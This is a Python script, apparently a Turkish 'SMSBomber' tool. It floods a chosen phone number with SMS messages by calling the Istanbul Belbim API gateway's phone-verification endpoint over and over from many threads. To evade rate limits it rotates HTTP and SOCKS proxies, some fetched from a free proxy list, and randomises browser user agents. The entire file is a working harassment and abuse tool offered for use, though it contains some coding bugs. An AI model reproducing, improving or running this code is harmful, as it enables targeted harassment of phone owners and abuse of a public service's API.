try:
    import os, requests, colorama, threading, time, urllib
    from random_user_agent.user_agent import UserAgent
    from random_user_agent.params import SoftwareName, OperatingSystem
except ImportError:
    input("İmport Hatası! Lütfen requirements.txt dosyasını kur.")
    exit()

colorama.init(convert=True)    

lock = threading.Lock()
counter = 0
errorcounter = 0
proxyfilelines = 0
proxies = []
proxy_counter = 0
modulename = "SMSBomber"
moduleowner = "TwistHaze"



class smsbomber:
    def __init__(self, phonenumber, proxytype = None, proxy = None):
        self.phonenumber = phonenumber
        self.proxy = proxy
        
    def get_token(self):
        proxies = None
        if self.proxy != None:
            if self.proxytype == 1:
                proxies = {"http": f"http://{self.proxy}","https": f"http://{self.proxy}"}
            if self.proxytype == 2:
                proxies = {"http": f"socks4://{self.proxy}","https": f"socks4://{self.proxy}"}
            if self.proxytype == 3:
                proxies = {"http": f"socks5://{self.proxy}","https": f"socks5://{self.proxy}"}                                
        try:    
            r = requests.post("https://apigateway.belbim.istanbul:8080/belbim/getRequest", headers = {"Content-Type": "application/json; charset=UTF-8"}, json = {"res":"NTE2ZDU2NGQ1ODMxNjQ0NjUxNmMzODc5NGQ0NDQ5Nzg1NTMwNjQ1NDU4MzE1NTc2NGMzMDY3NzQ1NjQ4NDI3MjUyNmMzODMwNTU1NjVhNDY1YTdhNTk3OTUyNTM0Njc5NWE2YjY0NmM1MjZhNjg2YjRiMzA3NDZlNGE1NzRhNjY2NTZiNjg2Yw=="}, proxies = proxies)
            return r.text.split('token":"')[1].split('"')[0]
        except:
            return False                
        
    def bomber(self):
        if self.get_token == None:
            return None, "Kayıt Hatası-Ratelimit"
        elif self.get_token == False:
            if self.proxy == None:
                return None, f"API İstek Gönderemiyor"
            return None, f"Proxy Hatası! Proxyni Değiş Tekrar Dene. {self.proxy}"
        
        software_names = [SoftwareName.CHROME.value]
        operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
        ua = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
        headers = {
            "User-Agent": ua.get_random_user_agent(),
            "Content-Type": "application/json;charset=UTF-8"
        }
        data = {
            "command":"RI.OnCheckPhoneNumber","id":self.get_token(),"data":{"CountryCode":"90","Cellphone":self.phonenumber}
                }
        proxies = None
        if self.proxy != None:
            if self.proxytype == 1:
                proxies = {"http": f"http://{self.proxy}","https": f"http://{self.proxy}"}
            if self.proxytype == 2:
                proxies = {"http": f"socks4://{self.proxy}","https": f"socks4://{self.proxy}"}
            if self.proxytype == 3:
                proxies = {"http": f"socks5://{self.proxy}","https": f"socks5://{self.proxy}"}
        try:
                requests.post(
                    "https://apigateway.belbim.istanbul:8080/belbim/getRequest",
                    headers = headers,
                    json = data,
                    proxies = proxies
                )
                return True, "Gönderildi! [API-1]"
        except:
                return False, "Gönderilemedi!"
    
    
    
    
os.system(f"title {modulename} by {moduleowner}")   
    
phonenumber = int(input(colorama.Fore.RESET + f"\n[{modulename}] +90 Olmadan Numarayı Yaz > "))
threads = int(input(f"\n[{modulename}] Kaç Tane Göndermek İstiyorsun > "))
print("\n[1] Proxy Kullanma\n[2] Proxy Kullan\n[3] Ücretsiz Proxyleri Dene(Proxyler Çok İyi Değil)")
proxyinput = int(input(f"\n[{modulename}] Tercih Yap > "))

if proxyinput == 2:
    print("\n[1] Http\n[2] Socks4\n[3] Socks5")
    proxytype = int(input(f"\n[{modulename}] Proxy Tipi Seç > "))
if proxyinput == 3:
    print("\n[1] Http\n[2] Socks4\n[3] Socks5")
    proxytype = int(input(f"\n[{modulename}] Proxy Tipi Seç > "))    
os.system("cls")

script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
rel_path = "../../../proxies.txt"
proxiesdir = os.path.join(script_dir, rel_path)
           
def load_proxies():
        global proxyfilelines
        if not os.path.exists(proxiesdir):
            print(colorama.Fore.YELLOW + "\nproxies.txt bulunamadı")
            time.sleep(5)
            os._exit(0)
        with open(proxiesdir, "r", encoding = "UTF-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                proxyfilelines = len(proxies)
                proxyfilelines += 1
                proxies.append(line)            
            if not len(proxies):
                print(colorama.Fore.YELLOW + "\nproxies.txt dosyasından proxyler yüklenemedi")
                time.sleep(5)
                os._exit(0)
    

def getfreeproxy():
    if proxytype == 1:
       # HTTP Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
    if proxytype == 2:
       # Socks4 Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
    if proxytype == 3:           
       # Socks5 Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
       
if proxyinput == 3:
        getfreeproxy()
        time.sleep(1)
        load_proxies()

if proxyinput == 2:
        load_proxies()

def safe_print(arg):
        lock.acquire()
        print(arg)
        lock.release()

def count():
        os.system(f'title [{modulename} by {moduleowner}] Sended = {counter} / Error = {errorcounter} / Proxy = {proxyfilelines}')

def thread_starter():
        global counter, errorcounter
        if proxyinput == 2:
            obj = smsbomber(phonenumber, proxytype, proxies[proxy_counter])
        if proxyinput == 3:
            obj = smsbomber(phonenumber, proxytype, proxies[proxy_counter])
        else:
            obj = smsbomber(phonenumber)
        result, message = obj.bomber()
        if result == True:
            counter += 1
            safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.GREEN + message)
            count()
        else:
            errorcounter += 1
            safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.RED + f"Error {message}")
            count()
            
while True:
        if threading.active_count() <= threads:
            try:
                threading.Thread(target = thread_starter).start()
                proxy_counter += 1
            except:
                pass
            if len(proxies) <= proxy_counter: #Loops through proxy file
                proxy_counter = 0
